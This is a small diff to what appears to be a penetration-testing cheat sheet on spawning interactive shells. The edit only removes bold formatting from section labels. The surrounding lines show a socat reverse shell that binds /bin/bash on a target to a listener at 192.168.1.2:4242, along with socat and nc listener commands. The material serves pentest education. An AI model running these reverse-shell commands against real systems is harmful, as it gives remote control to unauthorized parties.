@@ -84,13 +84,13 @@ $ stty rows <num> columns <cols>
 
 - Using `socat` to spawn a shell with interactive TTY
 
-- **Attacker**
+- Attacker
 
 ```
 user@pentestos:~$ socat file:`tty`,raw,echo=0 tcp-listen:4242
 ```
 
-- **Target**
+- Target
 
 `$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:4242`
 
@@ -106,7 +106,7 @@ spawn sh
 interact
 ```
 
-- **Output**
+- Output
 
 ```
 $ nc -lnvp 1234
